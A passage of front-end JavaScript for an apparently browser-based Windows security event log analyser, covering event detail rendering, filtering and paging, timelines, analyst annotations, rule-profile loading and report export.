      ['Windows event level',event.level],['Provider',event.source],
      ['Logon type',event.logonType ? event.logonType + ' · ' + (logonTypes[event.logonType] || 'Other logon type') : ''],
      ['New process path',event.process],['Creator process path',event.parent],['Process ID',event.processId],['Command line',event.command],
      ['Group',event.group],['Group SID',event.groupSid],['Service name',event.serviceName],['Service image',event.servicePath],
      ['Script block ID',event.scriptBlockId],['Script fragment',event.scriptFragmentTotal ? (event.scriptFragment || '?') + ' of ' + event.scriptFragmentTotal : ''],
      ['Task name',event.taskName],['Task content',event.taskContent],['Credential target server',event.targetServer],
      ['Audit subcategory',event.subcategory],['Audit changes',event.policyChanges],['Firewall rule',event.firewallRule || event.firewallRuleId],
      ['Firewall profile',event.firewallProfile],['Firewall setting',event.firewallSetting],['Firewall value',event.firewallValue]
    ].filter(([,value]) => value);
    const links = (relatedFindings.get(event.uid) || []).map(finding => '<button type="button" class="button button-quiet" data-finding-focus="' + finding.id + '">Back to ' + escapeHtml(finding.title) + '</button>').join('');
    const overlaps = duplicateRecords.get(event.duplicateOf || event.uid) || [];
    return '<dl class="match-fields">' + pairs.map(([label,value]) => pairHtml(label,value)).join('') +
      (overlaps.length ? '<p>Overlapping records retained in other sources: '+overlaps.map(record => escapeHtml(record.uid+' · '+sourceLabel(record))).join('; ')+'.</p>' : '')+
      '</dl><h4>Original event message</h4><pre tabindex="0" aria-label="Original event message">' + escapeHtml(preview(event.message || 'No Message column value')) +
      '</pre><details><summary>' + (event.inputFormat && event.inputFormat !== 'csv' ? 'All source and adapter fields' : 'All original CSV columns') + '</summary><dl class="match-fields">' +
      event.rawFields.map(item => pairHtml(item.header,item.value)).join('') + '</dl></details>' + links;
  }
  function viewState() {
    return { search:els['event-search'].value, id:els['filter-id'].value, priority:els['filter-severity'].value,
      ip:els['filter-ip'].value, type:els['filter-type'].value,sourceId:els['filter-source'].value,duplicates:els['filter-duplicates'].value, sort:els['event-sort'].value || 'csv' };
  }
  function matchingEvents() {
    const view = viewState(), key = JSON.stringify([activeEvidenceId,view]);
    if (viewCache?.key === key) return viewCache.events;
    const finding = currentFindings.find(item => item.id === activeEvidenceId);
    const events = reports.selectEvents(currentEvents,eventPriorities,view,finding ? new Set(finding.events.map(event => event.uid)) : null);
    viewCache = { key, events }; return events;
  }
  function pageSize() { return [25,50,100,250].includes(Number(els['page-size'].value)) ? Number(els['page-size'].value) : 100; }
  function renderTable() {
    const finding = currentFindings.find(item => item.id === activeEvidenceId), filtered = matchingEvents(), size = pageSize();
    els['evidence-scope'].hidden = !finding;
    els['clear-filters'].textContent = finding ? 'Clear filters in this evidence' : 'Clear event filters';
    els['evidence-title'].textContent = finding ? 'Supporting evidence for ' + finding.title + ' · ' + finding.ruleId + ' · ' + finding.events.length + ' event(s)' : '';
    page = Math.max(0,Math.min(page,Math.ceil(filtered.length / size) - 1));
    const shown = filtered.slice(page * size,(page + 1) * size);
    els['visible-count'].textContent = filtered.length + ' matching events' + (finding ? ' in finding evidence' : ' of ' + currentEvents.length);
    els['page-label'].textContent = filtered.length ? 'Rows ' + (page * size + 1) + '–' + (page * size + shown.length) + ' of ' + filtered.length : 'No matching events';
    els['page-first'].disabled = els['page-prev'].disabled = page === 0;
    els['page-last'].disabled = els['page-next'].disabled = (page + 1) * size >= filtered.length;
    els['event-rows'].innerHTML = shown.length ? shown.map(event => {
      const priority = eventPriorities.get(event.uid) || 'Informational';
      const summary = [labelById[event.id] || 'Other event',event.logonType ? 'Logon type ' + event.logonType + ' (' + (logonTypes[event.logonType] || 'Other') + ')' : '',
        event.process,event.serviceName,event.taskName,event.firewallRule].filter(Boolean).join(' · ').slice(0,500);
      return '<tr data-event-uid="' + event.uid + '"><td>' + escapeHtml(displayTime(event)) + '<br>' + escapeHtml(sourceLabel(event)) +
        '</td><td>' + event.id + '</td><td><span class="severity ' + priority.toLowerCase() + '">' + priority +
        '</span>'+(event.duplicateOf ? '<br><span class="duplicate-label">Duplicate of '+escapeHtml(event.duplicateOf)+' · excluded from rules</span>' : '')+'</td><td>' + escapeHtml((event.account || event.accountSid ? accountDisplay(event) : '—').slice(0,500)) + '</td><td>' +
        escapeHtml((event.ip || event.computer || '—').slice(0,500)) + '</td><td class="event-message">' + escapeHtml(summary) +
        '<details class="event-details" data-inspect="' + event.uid + '"><summary>Inspect ' + escapeHtml(sourceLabel(event)) + '</summary><div class="event-detail-body"></div></details></td></tr>';
    }).join('') : '<tr><td colspan="6" class="table-empty">No events match these filters. Clear filters to return to the selected evidence.</td></tr>';
  }
  function renderTimeline() {
    timelinePage = Math.max(0,Math.min(timelinePage,Math.ceil(noteworthy.length / TIMELINE_PAGE_SIZE) - 1));
    pager('timeline',timelinePage,TIMELINE_PAGE_SIZE,noteworthy.length);
    els.timeline.innerHTML = noteworthy.length ? noteworthy.slice(timelinePage * TIMELINE_PAGE_SIZE,(timelinePage + 1) * TIMELINE_PAGE_SIZE).map(event =>
      '<li><time>' + escapeHtml(displayTime(event)) + (event.date ? '' : ' · unparsed time; ordered by source record') + '</time><strong>' +
      escapeHtml(labelById[event.id] || 'Other event') + '</strong> · ' + escapeHtml(sourceLabel(event)) + ' · ' +
      escapeHtml((event.account || event.accountSid ? accountDisplay(event) : event.computer || 'Unknown host').slice(0,500)) + '</li>').join('') :
      '<li>No noteworthy activity generated by configured rules.</li>';
  }
  function updateReview(event) {
    const target = event.target, id = target.dataset.reviewStatus || target.dataset.reviewNote;
    const finding = currentFindings.find(item => item.id === id); if (!finding) return;
    const value = reports.normalizeAnnotation(annotations[id]);
    if (target.dataset.reviewStatus) value.status = target.value;
    else value.note = target.value;
    annotations[id] = { ...reports.normalizeAnnotation(value), ruleId:finding.ruleId, title:finding.title, eventUids:finding.events.map(item => item.uid) };
    const summary = target.closest('.review-notes')?.querySelector('summary');
    if (summary) summary.textContent = 'Analyst review · ' + annotations[id].status;
    dirtyNotes = true; noteRevision += 1; updateCaseStatus();
  }
  async function exportReport(format) {
    if (!analyzedAt || busy) return;
    clearTimeout(searchTimer);
    const token = ++taskToken, exportedRevision = noteRevision, isCase = format === 'case', mode = !isCase && els['export-scope'].value === 'view' ? 'view' : 'all';
    const events = mode === 'view' ? matchingEvents() : reports.selectEvents(currentEvents,eventPriorities,{sort:viewState().sort});
    const scopeUids = new Set(events.map(event => event.uid));
    const findings = orderedFindings.filter(finding => finding.events.every(event => scopeUids.has(event.uid)));
    const input = { events, findings, priorities:[...eventPriorities], annotations:{...annotations}, source:{...source},
      case:{...caseContext}, settings:analysisSettings, ruleProfile:analysisProfile, analyzedAt, browserTimezone, diagnostics,caseOrigin,
      coverage:correlationCoverage(currentEvents),ruleCoverage:currentRuleCoverage, scope:{mode,totalEvents:currentEvents.length,totalFindings:currentFindings.length,
        evidenceFindingId:mode === 'view' ? activeEvidenceId : null, filters:mode === 'view' ? viewState() : null,
        eventSort:viewState().sort, findingSort:els['finding-sort'].value} };
    setBusy(true); els['export-status'].textContent = 'Preparing download…';
    try {
      const content = await runner.run(isCase ? 'save-case' : 'export',{input,format,bytes:datasetBytes},message => { if (token === taskToken) setStatus(message); });
      if (token !== taskToken) return;
      const isJson = format === 'json' || isCase, blob = new Blob([content],{type:isJson ? 'application/json;charset=utf-8' : 'text/csv;charset=utf-8'});
      const url = URL.createObjectURL(blob), link = document.createElement('a');
      link.href = url; link.download = reports.filename(caseContext.title || source.name,isCase ? 'case' : isJson ? 'report' : format,isJson ? 'json' : 'csv');
      document.body.appendChild(link); link.click(); link.remove();
      setTimeout(() => URL.revokeObjectURL(url),30000);
      const contents = isJson ? events.length + ' events and ' + findings.length + ' complete findings' : format === 'findings' ? findings.length + ' complete findings' : events.length + ' events';
      els['export-status'].textContent = 'Download prepared: ' + contents + ' in ' +
        (mode === 'all' ? 'the entire dataset.' : 'the current evidence and filters.') + ' Check your browser downloads.';
      setStatus(isCase ? 'Saved-case download prepared. Reopen the JSON above to continue later.' : 'Report download prepared.');
      // A full JSON snapshot includes even annotations outside the current rules/settings.
      if (isJson && mode === 'all' && exportedRevision === noteRevision) { dirtyNotes = false; updateCaseStatus(); }
    } catch (error) {
      if (token === taskToken && error.name !== 'AbortError') { els['export-status'].textContent = 'Download failed: ' + error.message; setStatus(error.message,true); }
    } finally { if (token === taskToken) setBusy(false); }
  }

  function renderRuleProfile(){
    const rules=Object.entries(profiles.effectiveRules(currentProfile)),disabled=rules.filter(([,rule])=>!rule.enabled).length;
    els['rule-profile-status'].textContent=currentProfile.id+' · '+currentProfile.version+' · catalog '+profiles.catalog.version+' · '+disabled+' disabled rule(s).';
    els['rule-catalog'].innerHTML=rules.map(([id,rule])=>'<tr><td>'+escapeHtml(id)+'<br>'+escapeHtml(rule.title)+'</td><td>'+(rule.enabled?'Yes':'No')+'</td><td>'+rule.breakdown.reduce((sum,item)=>sum+item.points,0)+'</td></tr>').join('');
  }
  els['rule-profile-file'].addEventListener('change',async event=>{
    const file=event.target.files?.[0];if(!file||busy)return;
    if(!file.name.toLowerCase().endsWith('.json')||file.size>65536){els['rule-profile-status'].textContent='Choose a JSON rule profile up to 64 KB.';return;}
    const token=++taskToken;setBusy(true);setStatus('Reading rule profile…');
    try{
      const text=await file.text();if(token!==taskToken)return;
      currentProfile=profiles.normalizeProfile(inputs.parseJsonDocument(text));renderRuleProfile();
      els['rule-profile-file'].setAttribute('aria-invalid','false');setBusy(false);
      if(analyzedAt)await runAnalysis();else setStatus('Rule profile ready. Analyse events to apply it.');
    }catch(error){if(token===taskToken){els['rule-profile-file'].setAttribute('aria-invalid','true');els['rule-profile-status'].textContent='Profile rejected: '+error.message;setStatus('Rule profile rejected; the previous profile is still active.');}}
    finally{if(token===taskToken)setBusy(false);els['rule-profile-file'].value='';}
  });
  els['reset-rule-profile'].addEventListener('click',()=>{if(busy)return;currentProfile=profiles.defaultProfile;renderRuleProfile();if(analyzedAt)return runAnalysis();});
  els['download-rule-profile'].addEventListener('click',()=>{
    if(busy)return;
    const url=URL.createObjectURL(new Blob([JSON.stringify(currentProfile,null,2)],{type:'application/json;charset=utf-8'})),link=document.createElement('a');
    link.href=url;link.download=reports.filename(currentProfile.id,'rule-profile','json');document.body.appendChild(link);link.click();link.remove();setTimeout(()=>URL.revokeObjectURL(url),30000);
  });
  renderRuleProfile();
  els['analyze-button'].addEventListener('click',() => runAnalysis(true));
  els['save-case'].addEventListener('click',() => exportReport('case'));
  els['reopen-case-file'].addEventListener('change',event => reopenSavedCase(event.target.files?.[0]));
  els['cancel-task'].addEventListener('click',cancelTask);
  els['csv-file'].addEventListener('change',event => loadFiles(event.target.files));
  document.querySelectorAll('[data-sample]').forEach(button => button.addEventListener('click',async () => {
    if (!mayReplaceDataset()) return;
    const key = button.dataset.sample, text = makeCsv(sampleRows[key]);
    await processInput({text,bytes:new Blob([text]).size},sampleNames[key] + ' · Demo Data',{kind:'fictional demo'});
    document.querySelector('.demo-details').open = true;
  }));
  for (const id of filterIds) els[id].addEventListener('input',() => {
    clearTimeout(searchTimer); page = 0; invalidateView();
    if (id === 'event-search') searchTimer = setTimeout(renderTable,160); else renderTable();
  });
  els['event-sort'].addEventListener('change',() => { page = 0; invalidateView(); renderTable(); });
  els['page-size'].addEventListener('change',() => { page = 0; renderTable(); });
  els['finding-sort'].addEventListener('change',() => {
    orderedFindings = reports.sortFindings(currentFindings,els['finding-sort'].value); findingPage = 0; renderFindings();
  });
  for (const id of Object.values(settingIds)) els[id].addEventListener('change',() => { settings(); if (!els.report.hidden) return runAnalysis(); });
  els['reset-settings'].addEventListener('click',() => {
    for (const [key,id] of Object.entries(settingIds)) els[id].value = String(DEFAULT_SETTINGS[key]);
    if (!els.report.hidden) return runAnalysis();
  });
  els.findings.addEventListener('click',event => { const button = event.target.closest('[data-evidence]'); if (button) selectEvidence(button.dataset.evidence); });
  els.findings.addEventListener('input',updateReview);
  els.findings.addEventListener('change',updateReview);
  els['event-rows'].addEventListener('click',event => { const button = event.target.closest('[data-finding-focus]'); if (button) focusFinding(button.dataset.findingFocus); });
  els['event-rows'].addEventListener('toggle',event => {
    const details = event.target, record = eventByUid.get(details.dataset.inspect);
    if (details.open && record && !details.dataset.loaded) {
      details.querySelector('.event-detail-body').innerHTML = eventDetails(record); details.dataset.loaded = 'true';
    }
  },true);
  els['evidence-back'].addEventListener('click',() => focusFinding(activeEvidenceId));
  els['clear-filters'].addEventListener('click',() => { resetFilters(); renderTable(); });
  els['show-all-events'].addEventListener('click',() => { activeEvidenceId = null; resetFilters(); renderTable(); });
  for (const [id,change] of [['page-prev',-1],['page-next',1],['page-first',-Infinity],['page-last',Infinity]])
    els[id].addEventListener('click',() => {
      page = Number.isFinite(change) ? page + change : change < 0 ? 0 : Math.ceil(matchingEvents().length / pageSize()) - 1;
      renderTable(); els['events-title'].focus({preventScroll:true});
    });
  for (const [id,change] of [['findings-prev',-1],['findings-next',1]])
    els[id].addEventListener('click',() => { findingPage += change; renderFindings(); const first = orderedFindings[findingPage * FINDING_PAGE_SIZE]; if (first) focusFinding(first.id); });
  for (const [id,change] of [['timeline-prev',-1],['timeline-next',1]])
    els[id].addEventListener('click',() => { timelinePage += change; renderTimeline(); els['timeline-title'].focus({preventScroll:true}); });
  for (const [key,id] of Object.entries(caseIds)) els[id].addEventListener('input',() => {
    caseContext = reports.normalizeCase({...caseContext,[key]:els[id].value}); dirtyNotes = true; noteRevision += 1; updateCaseStatus();
  });
  for (const format of ['json','findings','events']) els['export-' + format].addEventListener('click',() => exportReport(format));
  window.addEventListener('beforeunload',event => { if (dirtyNotes) { event.preventDefault(); event.returnValue = ''; } });
  const zone = els['drop-zone'];
  for (const type of ['dragenter','dragover']) zone.addEventListener(type,event => { event.preventDefault(); zone.classList.add('dragover'); });
  for (const type of ['dragleave','drop']) zone.addEventListener(type,event => { event.preventDefault(); zone.classList.remove('dragover'); });
  zone.addEventListener('drop',event => loadFiles(event.dataTransfer.files));
  els['event-reference'].innerHTML = Object.entries(eventCatalog).map(([id,info]) =>
    '<div><dt>' + id + '</dt><dd>' + escapeHtml(info.label) + '<details><summary>Logging and required context</summary><p>' +
    escapeHtml(info.channel) + ' · ' + escapeHtml(info.audit) + '</p><p>' + escapeHtml(info.fields) + '</p></details></dd></div>').join('');
  setBusy(false);
})();

